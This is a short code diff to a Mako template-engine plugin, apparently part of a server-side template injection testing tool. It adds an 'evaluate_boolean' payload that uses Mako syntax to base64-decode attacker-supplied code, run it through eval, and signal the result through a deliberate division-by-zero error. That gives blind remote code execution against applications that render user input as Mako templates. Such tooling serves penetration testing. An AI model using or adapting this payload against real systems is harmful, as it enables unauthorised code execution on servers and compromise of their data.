@@ -39,7 +39,11 @@ class Mako(python.Python):
             },
             'evaluate_error': {
                 'evaluate': """{code}"""
-            }
+            },
+            'evaluate_boolean': {
+                'call': 'inject',
+                'evaluate_blind': """${{'' | u}}<%doc>${{1/0}}</%doc>${{str(1 / bool(eval(__import__('base64').urlsafe_b64decode('{code_b64}').decode())))}}"""
+            },
         })
 
         self.set_contexts([
